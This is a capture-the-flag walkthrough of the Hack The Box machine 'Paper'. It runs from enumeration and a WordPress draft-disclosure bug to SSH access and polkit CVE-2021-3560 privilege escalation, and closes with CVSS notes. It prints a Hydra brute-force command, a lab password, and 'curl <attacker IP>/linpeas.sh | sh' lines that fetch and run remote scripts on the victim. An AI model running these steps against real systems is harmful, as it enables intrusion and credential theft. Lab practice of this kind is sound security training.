# Machine 5: Paper

| Machine Name         | Nibbles                        |
| -------------------- | ------------------------------ |
| Creator              | secnigma                       |
| OS                   | Linux                          |
| Difficulty           | Easy                           |
| User Path            | Web                            |
| Privilege Escalation | Public Exploit (CVE-2021-3560) |

[TOC]

## 1. Introduction

Before we get start we have to setup our VPN connection and check if it has been properly established.

### 1.1 VPN

Before starting this exercise we have to establish a VPN connection through downloading the file with the VPN credentials on HTB and using the command:

```bash
sudo openvpn lab_nabecos.ovpn
```

### 1.2 Check Connectivity

Afterwards we can check of we have connectivity by:

1. Checking the networks accessible via the VPN

   ```bash
   netstat -rn
   ```

   ![image-20220409122559101](/home/kali/.config/Typora/typora-user-images/image-20220409122559101.png)

2. Checking which interfaces are configured on our machine.

   ```bash
   ip a
   ```

   ![](/home/kali/.config/Typora/typora-user-images/image-20220409122620900.png)

3. Pinging the machine

   ```bash
   ping -c 3 10.10.11.143
   ```

   We can successfully ping the machine! Let's start with some basic enumeration.

## 2. Enumeration

When approaching a machine we have to perform some basic enumeration, to understand what type of target we are dealing with.

### 2.1 Port Scanning with Nmap

 We first have to decide the Scan Technique we are going to use: 

- -sT: The **default** TCP connect scan (not stealthy since every TCP connect scan probe gets recorded in the daemon logs)
- -sS: SYN scan (stealthy since the scanner sends an RST packet to stop the handshake)

In the scope of this exercise, since there is no need to perform a SYN scan to hide our presence, upon performing Port Scanning we will focus on the **TCP Connect Scan**. Additionally, we are also interested in the **Version Detection Scan**.

> -sV: Version detection scan, this scan mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port (useful).

#### 2.1.1 Initial Scan

Let us begin with a quick nmap scan to look for open ports using the command:

```bash
nmap -sV --open -oA initial_paper_scan 10.10.11.143
```

> This will run a TCP connect scan with service enumeration (-sV) against the default top 1,000 ports and will only return open ports (--open). We will output all scan formats using -oA. This includes XML output, greppable output, and text output that may be useful to us later.
>

**Scan Result:**

| Port    | State | Service        | Version                                                      |
| ------- | ----- | -------------- | ------------------------------------------------------------ |
| 22/tcp  | open  | ssh            | OpenSSH 8.0 (protocol 2.0)                                   |
| 80/tcp  | open  | http           | Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |
| 443/tcp | open  | ssl/http>https | Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |

From the initial scan output, we can see that the host exposes an <span style="color:orange">Apache web server on port 80 and port 443 </span>and an <span style="color:red">OpenSSH server on port 22</span>. 

#### 2.1.2 Full TCP Scan

Before we start poking around at the open ports, we can run a full TCP port scan using the command. This will check for any services running on non-standard ports that our initial scan may have missed. This scans all 65,535 TCP ports.

```bash
nmap -p- --open -oA full_paper_tcp_scan 10.10.11.143
```

The results from the scan above were identical to the initial scan (except for the fact it did not contain the versions of each service). Hence, the machine only has three open ports: 22, 80 and 443/tcp.

#### 2.1.3 Scripted Scan

Now we can perform a scripted scan which provides additional details regarding the service running on each open port. This flag uses the default scripts, which are listed [here](https://nmap.org/nsedoc/categories/default.html).

```bash
nmap -sV -sC -p 22,80,443 -oA scripted_paper_scan 10.10.11.143
```

> PORT    STATE SERVICE  VERSION
> 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
> | ssh-hostkey: 
> |   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
> |   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
> |_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
> 80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
> | http-methods: 
> |_  **Potentially risky methods: TRACE**
> |_http-title: HTTP Server Test Page powered by CentOS
> |_http-generator: **HTML Tidy for HTML5 for Linux version 5.7.28**
> |_http-server-header: **Apache/2.4.37 (centos)** **OpenSSL/1.1.1k** mod_fcgid/2.3.9
> 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
> | http-methods: 
> |_  **Potentially risky methods: TRACE**
> |_http-generator: **HTML Tidy for HTML5 for Linux version 5.7.28**
> |_http-title: HTTP Server Test Page powered by CentOS
> | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
> | Subject Alternative Name: DNS:localhost.localdomain
> | Not valid before: 2021-07-03T08:52:34
> |_Not valid after:  2022-07-08T10:32:34
> | tls-alpn: 
> |_  http/1.1
> |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
> |_ssl-date: TLS randomness does not represent time

From this scan's output we can extract a lot of interesting information:

- Web Server: Apache Server/2.4.37, OpenSSL/1.1.1k, mod_fcgid/2.3.9
- SSH Server: OpenSSH 8.0 (protocol 2.0)
- OS: CentOS Linux

Let us store these results for later (after highlighting some interest information) and move on to using the http-enum script, which can be used to **enumerate common web application directories**. 

```bash
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <ip>
```

> PORT    STATE SERVICE  VERSION
> 22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
> 80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
> |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
> | http-enum: 
> |   /icons/: Potentially interesting folder w/ directory listing
> |_  /manual/: Potentially interesting folder
> 443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
> |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
> | http-enum: 
> |   /icons/: Potentially interesting folder w/ directory listing
> |_  /manual/: Potentially interesting folder

We got some interesting information for later use such as the existence of **two folders called manual and icons**. Let us continue.

#### 2.1.4 UDP Scan

![image-20220413181655536](/home/kali/.config/Typora/typora-user-images/image-20220413181655536.png)

I also decided to perform a UDP scan to check for open UDP ports and noticed it was running the multicast DNS protocol which resolved hostsnames to IP addresses within small networks.

### 2.2 OS Fingerprinting

Despite already having the knowledge that the machine's OS is the Linux distribution CentOS, let us perform OS fingerprinting anyways to verify this information. We are going to use Nmap and add the -Pn option to skip the ping scan since we already know who is our target and that this machine is alive .

```
sudo nmap -Pn -O 10.10.11.143 
(this command requires root privileges)
```

Unfortunately, the scan result tells us that there is no exact OS matches for the host. Let us try a more aggressive inspection then:

```
sudo nmap -Pn -O --osscan-guess 10.10.11.143
```

> Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.2.2 (Linux 3.4) (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
> No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

The results show that there is a every high probability that our target is running Linux. Regarding the version it is most likely between 3.2 and 4.9.

### 2.3 Banner Grabbing with NetCat

We can also run NetCat to perform banner grabbing and verify the information provided by Nmap: the target is running a web server and an OpenSSH server.

```bash
nc -nv 10.10.11.143 22
```

- UNKNOWN) [10.10.11.143] 22 (ssh) open
  SSH-2.0-OpenSSH_8.0

```bash
nc -nv 10.10.11.143 80
```

- (UNKNOWN) [10.10.11.143] 80 (http) open

```bas
nc -nv 10.10.11.143 443
```

- (UNKNOWN) [10.10.11.143] 443 (https) open

## 3. Web Fingerprinting

With the information gathered from the previous section we have already been able to perform some web server footprinting.

Despite this, let us verify the results and see if we can get additional information with some techniques.

### 3.1 Manually Fingerprinting 

#### 3.1.1 Netcat (no encryption)

The command below is supposed to return the only the headers of the request.

```
nc 10.10.11.143 80
HEAD / HTTP/1.0


```

Unfortunately for some reason the request was consistently returning 400 Bad Request using Netcat (which I later understood was because I was sending a badly formatted request and fixed it by adding the **-C option**). Therefore I switched to Burp Suite to try and understand what was happening. I ran the following request to check if the HEAD HTTP verb was allowed.

![image-20220409133138198](/home/kali/.config/Typora/typora-user-images/image-20220409133138198.png)

It was allowed but was returning a 403 Forbidden using Burp Suite. Hence, I must have been sending a request with missing headers or badly formatted in Netcat.

![image-20220409133334348](/home/kali/.config/Typora/typora-user-images/image-20220409133334348.png)

With this response we get some interesting information (which we already knew) like the web server version Apache/2.4.37, the OS (centos), etc... 

We also get an interesting header called **X-Backend-Server** which after googling what it represents we get: "the target website returns the X-Backend-Server header which includes potentially internal/hidden IP addresses or hostnames. By exposing these values, attackers may attempt to circumvent security proxies and access these hosts directly."

After browsing or performing a curl to office.paper:

```
curl -v office.paper
```

> Could not resolve host: office.paper
>
> Closing connection 0
> curl: (6) Could not resolve host: office.paper

This means that the website has not been made public and that the target website's IP Address cannot be resolved by performing a DNS query. We can view a development or pre-launch website with a custom domain name by modifying the /etc/hosts file on our local machine. The /etc/hosts file contains a mapping of IP addresses to URLs.

```bash
sudo nano /etc/hosts
```

![image-20220409135526215](/home/kali/.config/Typora/typora-user-images/image-20220409135526215.png)

After adding this entry to the file we can browse to the resource which curiously **does not enforce HTTPS**.

![image-20220414182311193](/home/kali/.config/Typora/typora-user-images/image-20220414182311193.png)

Additionally, as we can see above the certificate is self signed meaning the entity signed it with its own private key, instead of requesting it from a public or a private CA. This is dangerous because in case of a security breach, there is no way to know is the certificate and its key have been compromised, not to mention their inability to be revoked and the fact that the attacker can now spoof the identity of the victim.

![image-20220409135555977](/home/kali/.config/Typora/typora-user-images/image-20220409135555977.png)

After finding this domain we can apply the same technique to office.paper:

```
nc -C 10.10.11.143 80
HEAD / HTTP/1.1
Host: office.paper


```

> HTTP/1.1 200 OK
> Date: Sat, 09 Apr 2022 19:23:41 GMT
> Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
> **X-Powered-By: PHP/7.2.24**
> **Link: <http://office.paper/index.php/wp-json/>; rel="https://api.w.org/"**
> X-Backend-Server: office.paper
> Content-Type: text/html; charset=UTF-8

The response shows two interesting headers:

- **X-Powered-By**: This header describes the technologies used by the web server, in this case PHP version 7.2.24
- **Link**: This link redirects the user to the web server's WordPress Rest API, which should be visible to regular users since it provides information about all the different endpoints. This is sensible information.

Interestingly enough this information can be validated by using whatweb and some additional information can be extracted:

```
whatweb http://office.paper
```

> http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], **JQuery, MetaGenerator[WordPress 5.2.3]**, OpenSSL[1.1.1k], PHP[7.2.24], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], **UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]**

We can see some of the technologies in use such as **Bootstrap**, **WordPress 5.2.3**,**HTML5**, **jQuery**, and **PHP**.

#### 3.1.2 OpenSSL (encryption)

```
openssl s_client -crlf -connect 10.10.11.143:443
HEAD / HTTP/1.1
Host: office.paper


```

Note: Despite always returning a 403 Forbidden response, the HTTP requests **do not return the X-Backend-Server Header**.

### 3.2 Automatic Fingerprinting 

We can use Httprint which is a fingerprinting tool that uses a **singnature-based technique** to identify web servers.

```bash
httprint -P0 -h 10.10.11.143 -s /usr/share/httprint/signatures.txt
```

> -P0: avoids pinging the host (most web server do not respond to ping echo requests)
>
> -h <target hosts>: tells the tool to fingerprint a list of hosts, you can also provide a range of IP addresses
>
> -s <signature-file>: set the signature file to use

We get some interesting results 

> .........
>
> Banner Reported: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
> Banner Deduced: Microsoft-IIS/6.0
> Score: 91 Confidence: 54.82
>
> Scores: 
> Microsoft-IIS/6.0: 91 54.82
> Apache/2.0.x: 85 42.85
> Apache/1.3.26: 82 37.56
> Apache/1.3.27: 81 35.89
> Apache/1.3.[4-24]: 80 34.28
> Apache/1.3.[1-3]: 75 26.89
> TUX/2.0 (Linux): 73 24.25
>
> ........

Despite getting the reported banner with the server running **Apache/2.4.37**, the tool's best guess is that the web server is running  **Microsoft-IIS/6.0**. Nonetheless, the following best guesses are **Apache** so that is something to also take note of. It is also possible that maybe I did not use the best signature file.

These results are interesting and we will take them into consideration when moving forward with the exercise.

## 4. File Directory Enumeration

In the previous sections we have probed the server trying to discover its technologies, open ports, services and OS version. After this research we found:

- **10.10.11.143**: The HTTP Server Test Page
- **office.paper**: A web page 

We have also found out about a couple of directories in the HTTP Server Test Page:

- **/manual/**: Documentation regarding the Apache Server (discloses the Apache Server runs version 2.4)
- **/icons/**: Folder with .png and .gif files

We have a couple different tools we can use for File Directory Enumeration at our disposal:

1. **Dirb**
2. **Dirbuster**
3. **Gobuster**

According to my perception while dirb supports **recursive enumeration**, Gobuster does not. On the other hand, Gobuster is faster since it can **take advantage of multiple threads** for faster enumeration.

Dirbuster has all those options and provides a visual interface (GUI) to help users get an overview of the results in a tree format.

### 4.1 Dirb and Dirbuster

**Target: http://10.10.11.443**

Let us experiment using dirb first. Since we are not constrained with time limits I was thinking about using the big.txt dictionary file for our enumeration. After starting the process and checking that it would take A LOT of time to complete (its default option searches recursively), I changed my approach to a non recursive search with a smaller wordlist. 

```
dirb http://10.10.11.143 -r /usr/share/dirb/wordlists/common.txt -o dirb_common_ip.txt
```

This search only uncovered the manual directory. Despite other searches with **dirbuster** (where i had access to the tree view of the directories and files enumerated) showed that this page had a lot of resources, I decided to move on to office.paper since that is probably where the vulnerabilities we are trying to exploit are.

### 4.2 Gobuster

**Target: http://office.paper**

```
gobuster dir -u http://office.paper/ -w /usr/share/dirb/wordlists/common.txt -o gobuster_enum_office.txt
```

The results showed a couple of directories and files:

> /.hta                 (Status: 403) [Size: 199]
> /.htaccess            (Status: 403) [Size: 199]
> /.htpasswd            (Status: 403) [Size: 199]
> /cgi-bin/             (Status: 403) [Size: 199]
> /index.php            (Status: 301) [Size: 1] [--> http://office.paper/]
> /manual               (Status: 301) [Size: 235] [--> http://office.paper/manual/]
> /wp-admin             (Status: 301) [Size: 237] [--> http://office.paper/wp-admin/]
> /wp-content           (Status: 301) [Size: 239] [--> http://office.paper/wp-content/]
> /wp-includes          (Status: 301) [Size: 240] [--> http://office.paper/wp-includes/]

After inspecting each page and doing some google searches I gathered the following conclusions:

- .hta
- .htaccess: Configuration file for use on web servers running the Apache Web Server software.
- .htpasswd: Used to create and update the flat-files used to store usernames and password for basic authentication of HTTP users. 
- /cgi-bin/:  Folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website.

- /index.php: Redirects to the home page of the website
- /manual: Redirects to the documentation of the Apache Server
- /wp-admin: Redirects to the login admin page of Wordpress where they can perform all actions on a WordPress website and have full capabilities.
- /wp-content: Directory that contains all user-supplied content. Basically anything you can upload to your site ends up here.
- /wp-includes: Contains your plugins and themes, the wp-includes folder contains all the remaining files and folders required for your website to function properly.

Many more files and directories were found using file directory enumeration but on a first glance i could not find any specific resource (which I had access to) that was interesting and could have some sensitive information. Hence, our next step is to explore the website and see what we can find.

## 5. Vulnerability Assessment

office.paper is a simple blog created for the employees of "[Blunder Tiffin Inc.](http://office.paper/)". After a quick overview of the three posts and their associated comments we know two things:

- That Michael Scott is the only current user with an active account (the others have been deleted) and;
- Michael has something/sensitive information stored in his drafts which could be of value to a threat actors.

![image-20220409174430621](/home/kali/.config/Typora/typora-user-images/image-20220409174430621.png)

After a simple search for the letter 'a' (common vowl) or an empty string we get all the posts from the website. There are two more posts which were not available from the start but they don't add too much to the current knowledge we already have.

![image-20220409174823684](/home/kali/.config/Typora/typora-user-images/image-20220409174823684.png)

### 5.1 Manual Search for Vulnerabilities

#### 5.1.1 SQL Injection

We also have access to a search function on the website. I checked for an SQLInjection point just for fun even though there is no SQL database on the server and failed miserably. I even tried to check with sqlmap just to clear my mind by running:

```bash
sqlmap -u http://office.paper/?s=a -p s
```

But nothing came up.

#### 5.1.2 XSS

I also tried to check if the web application was vulnerable to XSS but after an attempt or two like the one below I could not get an alert to pop up on the website, so I gave up for the time being.

![image-20220409180925716](/home/kali/.config/Typora/typora-user-images/image-20220409180925716.png)

#### 5.1.3 User and email Enumeration

What to do next? Try to log in.

We have access to some usernames by checking the users that created each post, such as for example "prisonmike".

If we go to the login page at http://office.paper/wp-login.php we can verify that the server gives us some interesting information. For example, if we type a random username the error returned is "Invalid Username". 

![image-20220409182105733](/home/kali/.config/Typora/typora-user-images/image-20220409182105733.png)

But if we enter, a valid username such as "nick" or "prisonmike" we get a different error message:

![image-20220409182223186](/home/kali/.config/Typora/typora-user-images/image-20220409182223186.png)

Hence, the web application is vulnerable to **username enumeration**. Since we have a username already we do not need to uncover what other usernames exist for the time being. Additionally after experimenting with the forgot my password feature this is also vulnerable to **username and email enumeration**.

After entering prisonmike's password we get an error saying that:

> The email could not be sent. Possible reason: your host may have disabled the mail() function.

![image-20220409182949801](/home/kali/.config/Typora/typora-user-images/image-20220409182949801.png)

One other username we can try is "nick". After trying to reset their passwords the same error popped up.

#### 5.1.4 Authentication Attack (Hydra)

Before finishing trying to find a way to bypass the login form I decided to try performing a password attack using **prisonmike** as the user.

Using burp suite we can easily see the login request and response, in case the user fails the login attempt:

![image-20220410165432102](/home/kali/.config/Typora/typora-user-images/image-20220410165432102.png)



Using hydra let us try to crack the password using a wordlist:

```
hydra office.paper http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -l prisonmike -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt -f -V
```

> -f: Exit after first login
>
> -V: Set verbosity level

After trying with both the rockyou-15.txt and the 2020 most used passwords from **seclists** I was not able to guess the password. Hence, I moved on from the login page.

#### 5.1.5 office.htb

A couple of files can be downloaded from the bottom of the page under the "Entries RSS" and "Comments RSS". We checked them and saw an interesting thing that we can maybe exploit.

![image-20220409192839366](/home/kali/.config/Typora/typora-user-images/image-20220409192839366.png)

I doubted it would work as it did not make much sense but could the office.htb resource be added to /etc/hosts and be accessible as we did with office.paper to uncover more about our target? Well i tried to do it but no dice, nothing would forward me to a new page.

#### 5.1.6 WordPress

As a last resort I searched online for WordPress vulnerabilities. As we have seen earlier `whatweb http://office.paper` told us the version of Wordpress which is 5.2.3. Additionally, inspecting the page's HTML code also provided this information.

![image-20220410144109410](/home/kali/.config/Typora/typora-user-images/image-20220410144109410.png)

Hence, by taking advantage of searchsploit and the exploit-db website I searched for **WordPress 5.2.3**. The output showcased a couple of results but one piked my interest. We know that other users have notified michael to stop storing sensitive information on the drafts. The second exploits mentions "Viewing Unauthenticated Private Posts" so let us get more information regarding this exploit.

![image-20220414115107579](/home/kali/.config/Typora/typora-user-images/image-20220414115107579.png)

After browsing to the URL we can see some details about CVE-2019-17671:

![image-20220409202004153](/home/kali/.config/Typora/typora-user-images/image-20220409202004153.png)

Therefore, I proceeded to try and add the **?static=1** and got the following information.

![image-20220409202300230](/home/kali/.config/Typora/typora-user-images/image-20220409202300230.png)

This is something new! Now we have access to a new subdomain! 

### 5.2 Automatic Search for Vulnerabilities using Nessus

Before moving ahead to the new subdomain I decided to run a Nessus Scan in the background to check for any other vulnerabilities in the office.paper website I might have missed.

After a few minutes I decided to check the vulnerabilities which Nessus had already found:

![image-20220409205039773](/home/kali/.config/Typora/typora-user-images/image-20220409205039773.png)

Some of them we have already identified, but lets leave the scan alone for a bit and move on.

### 5.3 User Access

Let us edit our /etc/hosts file once again to include the chat:

![image-20220409205420630](/home/kali/.config/Typora/typora-user-images/image-20220409205420630.png)

If we visit this new website we can see that we have access to a chat where we can register an account. After registering an account and exploring a bit we notice that every worker of Dunder Mifflin is offline and the only available user online is a Bot created by Dwight: Recylopes. If we start chatting with him he tells us what are his functionalities. To sum up we have several methods at our disposal:

- **list**: works the same as ls -la
- **time**: Returns the time, similar to the date command
- **file**: Outputs the contents of a file, similar to the cat command

Unfortunately we can't type 'list && other command' or something as the bot notifies us **not to inject OS commands.**

Through these commands I was able to try and open the user.txt file (possibly containing the first flag) and the .ssh folder. Unfortunately, we did not have access to open the user.txt file and the .ssh folder was empty.

After **A LOT** of enumeration i finally found something useful. We can see a .env file when we run `list ../hubot/`. And we can access its contents with `file ../hubot/.env`.

> export ROCKETCHAT_URL='http://127.0.0.1:48320'
> export ROCKETCHAT_USER=recyclops
> export ROCKETCHAT_PASSWORD=Queenofblad3s!23
> export ROCKETCHAT_USESSL=false
> export RESPOND_TO_DM=true
> export RESPOND_TO_EDITED=true
> export PORT=8000
> export BIND_ADDRESS=127.0.0.1

Now that we have recyclops credentials, can we log in with him in the chat app?

![image-20220409220157377](/home/kali/.config/Typora/typora-user-images/image-20220409220157377.png)

After this failed attempt I tried to login using SSH with the **recyclops:Queenofblad3s!23** which also failed miserably. I don't even know if that user exists. That is when i remembered we know two users who exist: **root** and **dwight**. So i tried to login in SSH with **dwight:Queenofblad3s!23** and it WORKED. I also tried to login to root using the same password but it did not work.

After logging in as "dwight" a quick `ls` showed the user.txt file and we got our first flag using `cat`.

![image-20220409221635200](/home/kali/.config/Typora/typora-user-images/image-20220409221635200.png)

For demonstration purposes, we are able to validate some basic information collected from the previous enumerations steps: such as the kernel version and OS version (CentOS version 8, a Linux distribution).

![image-20220410151726888](/home/kali/.config/Typora/typora-user-images/image-20220410151726888.png)

#### 5.3.1 Alternative

Another possible way to check this would be to validate dwight's password would be to access the hashed password in the **/etc/shadow file** and checking if this hashed value is the same to hashing the "Queenofblad3s!23" string using the hashing method stored in **/etc/login.defs**. I did not try this though it is merely a hypothesis that needs to be validated. The user would need to have access to both files using recyclopes' commands.

Nonetheless, you could simply try to login using SSH as I did and check if you could do it with the supplied password.

## 6. Privilege Escalation

### 6.1 Manual Approach

First things first, according to what I learned from HTB Academy I should run the script **LinEnum.sh** which would provide me information regarding:

- Which users have recently used sudo
- Determine if /etc/sudoers is accessible
- Determine if the current user has Sudo access without a password
- Are known ‘good’ breakout binaries available via Sudo (i.e. nmap, vim etc.)
- Is root’s home directory accessible
- List permissions for /home/

Therefore I decided to transfer the file from my local machine to the target machine using:

```
python3 -m http.server 80 #Host
curl 10.10.14.185/LinEnum.sh | sh #Victim
```

After checking the output I could not find any information regarding scripts which could be ran as sudo without being necessary to pass on the root password. Hence, after some googling and using the HTB forums for help, some people were talking about using Linpeas.sh instead. Therefore, I did the same thing with this new script file and decided to run it.

```
python3 -m http.server 80 #Host (skipped this one since the server was still running)
curl 10.10.14.185/linpeas.sh | sh #Victim
```

After running linpeas, the script informs us that the server is vulnerable to **CVE-2021-3560**.

![image-20220410125907176](/home/kali/.config/Typora/typora-user-images/image-20220410125907176.png)

A quick search using google redirected me to the github page https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation. Here the user describes a vulnerability in polkit that when properly exploited enables an unprivileged local user to get a root shell on the system which is exactly what we need to to access the /root dir. 

![image-20220409232105267](/home/kali/.config/Typora/typora-user-images/image-20220409232105267.png)

The first time i ran the exploit it did not work but it was not problematic since the author specifically states that "multiple attempts are required to get the timing right". Supposedly, the exploit works with 3 commands:

1. ./file.sh
2. su - secnigma (or any other user that is created using the script)
3. sudo bash

Unfortunately, even when the console would display that that the username was created i would not be able to perform `su - secnigma` as it would return "Authentication failed" every single time.

![image-20220409232856352](/home/kali/.config/Typora/typora-user-images/image-20220409232856352.png)

As an alternative i researched for an alternative and I found one which was performed by a script built using C (https://github.com/hakivvi/CVE-2021-3560). This time however I was unsuccessful when trying to compile the file.

![image-20220409233108810](/home/kali/.config/Typora/typora-user-images/image-20220409233108810.png)

I went back to the 1st attempt mainly because the author of the script that exploited the vulnerability was the same person who designed the Paper machine, so I had to be on the right track.

I ran the script with the username and password flags enabled so that I would be able to pass on a specific username:password pair and still nothing. 

![image-20220409233247506](/home/kali/.config/Typora/typora-user-images/image-20220409233247506.png)

Finally, i went to the script and changed the password variable from "secnigmaftw" to "". This time after running the script i was prompted to enter a password. After entering a specific password, running su - secnigma and inserting the password i had created we successfully logged in as the secnigma user. Finally, after running sudo bash and entering secnigma's password we had root access. a simple `cat` to the root.txt provided us with the root flag.

![image-20220409233519047](/home/kali/.config/Typora/typora-user-images/image-20220409233519047.png)

### 6.2 Metasploit

After manually performing the attack I was curious to see if I could achieve the same result using Metasploit.

Finding the exploit was not hard.

```
msfconsole
search exploit polkit
```

![image-20220410140112188](/home/kali/.config/Typora/typora-user-images/image-20220410140112188.png)

The exploit with id number 2 seems recent, has an excellent rank which ensures that it will never crash the service and the description seems to fit with the one regarding CVE-**2021**-3560 (not to mentions its disclosure date is 2021). Additionally the remaining information provided by typing info ensures that this exploit is the same we used above. Hence, i selected the exploit and checked what options we had to setup to use it

```
use 2
show options
```

Basically we had to configure:

- Session

![image-20220410140742698](/home/kali/.config/Typora/typora-user-images/image-20220410140742698.png)

In order to do this I proceeded to create an SSH session using metasploit and the auxiliary/scanner/ssh_login module:

![image-20220410141253680](/home/kali/.config/Typora/typora-user-images/image-20220410141253680.png)

I tried to perform the exploit using this session and many different other payload options (such as one that mentioned **ssh with id 4**) but for some reason the exploit would never work stating "Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The polkit framework is not installed. "set ForceExploit true" to override check result.". Setting ForceExploit to true did not work.

![image-20220410141937007](/home/kali/.config/Typora/typora-user-images/image-20220410141937007.png)

Hence, I decided that maybe the problem was that the session i had access to was not a meterpreter shell? This way after searching how to upgrade from an SSH shell to a meterpreter one (later found out you can achieve the same result using the sessions **-u option**) I executed the following commands.

![image-20220410141710705](/home/kali/.config/Typora/typora-user-images/image-20220410141710705.png)

Unfortunately, even after upgrading the shell I got the same result once again and could not successfully make the exploit work. I most likely missed something in the configuration and I bet it is related to the payload options.

## 7. Conclusions

This sections aims to summarize the most relevant vulnerabilities I could find and take note of for the penetration test report and that helped me compromise the machine (identified both manually and by taking advantage of Nessus). 

Each manual vulnerability which was not identified with Nessus had its CVSS v3.1 calculated using this online [calculator](https://www.first.org/cvss/calculator/3.1) and its vector string generated. I used Base Metrics and Temporal Metrics for the purpose of the scoring in this document since I cannot measure the importance of the affected IT asset to the target organization. Despite calculating scores taking into account Temporal metrics, the score that will be used for the Penetration Test report only takes into account base metrics.

For a complete list of the findings you can consult the full findings Excel.

### 7.1 Vulnerabilities discovered manually

1. X-Backend-Server Header discloses internal/hidden hostname

2. OS, SSL and Apache Version Detection

3. Browsable Web application resources (eg: /manual/)

4. HTTPS is not enforced on the application, hence passwords can be sniffed when users try to login

5. Self signed certificate

6. Username Enumeration in the login portal 

7. Password reminder active in the login portal

   ![image-20220414184557602](/home/kali/.config/Typora/typora-user-images/image-20220414184557602.png)

8. Username and Email enumeration in the forgot my password portal

9. WordPress, jQuery, and PHP Version Detection and Bootstrap being used as technologies

10. Possible to brute force passwords with enough time (no prevention mechanism in place such as ip block)

11. [WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts](https://www.exploit-db.com/exploits/47690) (update wordpress version)

12. CVE-2021-3560 Polkit Privilege Escalation

#### 7.1.1 CVSS Calculation

1. X-Backend-Server Header discloses internal/hidden hostname (5.3/5.1/Medium) (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C)

   - Exploitability Metrics
     - Attack Vector: Network - This can mean an attack must be launched from the same shared physical or logical network, or from within a secure or otherwise limited administrative domain (e.g., MPLS, **secure VPN to an administrative network** **zone**).
     - Attack Complexity: Low - An attacker can expect repeatable success when attacking the vulnerable component.
     - Privileges Required: None - The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to  carry out an attack.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Unchanged - The exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In  this case, I think that the vulnerable component and the impacted component is the same: the Web Application.
   - Impact Metrics
     - Confidentiality: Low - There is some loss of confidentiality. Access to some restricted  information is obtained, but the attacker does not have control over  what information is obtained, or the amount or kind of loss is limited. The information that is obtained is the existence of the **office.paper** domain.
     - Integrity: None - There is no loss of integrity within the impacted component.
     - Availability: None - There is no impact to availability within the impacted component.
   - Temporal Metrics
     - Exploit Code Maturity: High - No exploit is required (manual trigger).
     - Remediation Level: Official Fix - Since this is a custom header (starts with X) I reckon you could simply not pass the header as a response to the requests.
     - Report Confidence: Confirmed - Passing headers that disclose unnecessary information is a common vulnerability.

2. Username and Email Enumeration in the "Forgot My Password" Portal (5.3/5.1/Medium) (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C)

   - Exploitability Metrics
     - Attack Vector: Network - The target it “remotely exploitable”. **(Should it be network because it is exploitable from the internet if the target is using wordpress OR is it adjacent because in our specific situation we can only access the target through the vpn?).**
     - Attack Complexity: Low - An attacker can expect repeatable success when attacking the vulnerable component.
     - Privileges Required: None - The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.
     - User Interaction: None - The vulnerable system can be exploited without interaction from any user.
   - Scope Metric
     - Scope: Unchanged - In this case, I think that the vulnerable component and the impacted component is the **web application**.
   - Impact Metrics
     - Confidentiality: Low - There is some loss of confidentiality. Access to some restricted information is obtained. The information that is obtained is the existence of a specific/several usernames and email addresses.
     - Integrity: None - There is no loss of integrity within the impacted component.
     - Availability: None - There is no impact to availability within the impacted component.
   - Temporal Metrics
